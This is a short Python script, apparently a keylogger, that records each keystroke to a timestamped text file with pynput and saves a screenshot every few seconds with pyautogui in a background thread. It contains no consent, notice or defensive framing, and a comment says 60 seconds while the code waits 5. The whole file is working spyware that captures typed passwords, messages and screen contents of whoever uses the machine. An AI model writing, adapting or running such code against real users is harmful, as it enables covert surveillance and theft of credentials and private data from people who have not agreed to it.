from pynput.keyboard import Listener
from datetime import datetime
import pyautogui
import threading

# Set up session-based filename
session_start = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
keylog_filename = f"keylog_{session_start}.txt"

def log_keystrokes(key):
    # Convert the key to a string and clean up
    key = str(key).replace("'", "")
    
    # Handle special keys
    if key == 'Key.space':
        key = ' '
    elif key == 'Key.enter':
        key = '\n'
    elif key == 'Key.backspace':
        key = '[BACKSPACE]'
    elif 'Key' in key:  # For other special keys like shift, ctrl, etc.
        key = f"[{key.split('.')[1].upper()}]"

    # Write the keystroke to the session-based log file
    with open(keylog_filename, 'a') as log_file:
        log_file.write(key)

# Function to capture screenshots at intervals
def take_screenshot():
    while True:
        # Set up a filename with a timestamp for each screenshot
        timestamp = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
        screenshot_filename = f"screenshot_{timestamp}.png"
        
        # Take a screenshot and save it
        screenshot = pyautogui.screenshot()
        screenshot.save(screenshot_filename)
        
        # Wait for 60 seconds before taking the next screenshot
        threading.Event().wait(5)

# Start the screenshot thread
screenshot_thread = threading.Thread(target=take_screenshot)
screenshot_thread.daemon = True
screenshot_thread.start()

# Start listening to keystrokes
with Listener(on_press=log_keystrokes) as listener:
    listener.join()
